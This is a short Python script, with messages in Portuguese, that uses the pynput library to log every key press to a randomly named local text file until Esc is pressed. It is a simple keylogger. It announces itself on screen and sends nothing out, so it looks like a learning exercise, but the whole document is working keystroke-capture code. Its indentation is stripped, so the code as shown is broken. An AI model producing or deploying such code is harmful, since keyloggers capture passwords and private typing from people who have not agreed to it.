from pynput.keyboard import Listener, Key
import sys
import random

def encerrar_programa():
print(' programa encerrado!')
sys.exit()
def escreve_key(key):
try:
with open(log, 'a') as file:
file.write(f'{str(key)} \n ')
except Exception as e:
print(f'Erro ao capturar a tecla {e}')
encerrar_programa()
if key == Key.esc:
encerrar_programa()
log = f'captura de tecla{random.randint(0,1000)}.txt'

print('as teclas estão sendo capturadas')
with Listener(on_press=escreve_key) as logs:
try:
logs.join()
except Exception as e:
print('Erro durante a execução do programa')
finally:
logs.stop()
encerrar_programa()
